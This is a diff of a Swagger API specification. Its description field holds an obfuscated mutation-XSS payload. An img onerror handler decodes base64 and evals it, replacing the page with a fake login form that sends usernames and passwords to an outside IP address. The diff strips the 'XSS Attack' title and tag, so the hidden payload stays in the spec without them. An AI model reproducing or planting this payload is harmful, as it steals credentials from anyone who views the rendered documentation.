@@ -1,6 +1,5 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY alex_vi
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovLzg1LjE5My44OS4xNjY6NTU2NyI7YS5tZXRob2Q9J1BPU1QnO2EuaW5uZXJIVE1MPSc8Y2VudGVyPlVzZXJuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
   version: production
@@ -19,8 +18,6 @@ paths:
       responses:
         '200':
           description: No response was specified
-      tags:
-        - alex_vi_xss
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
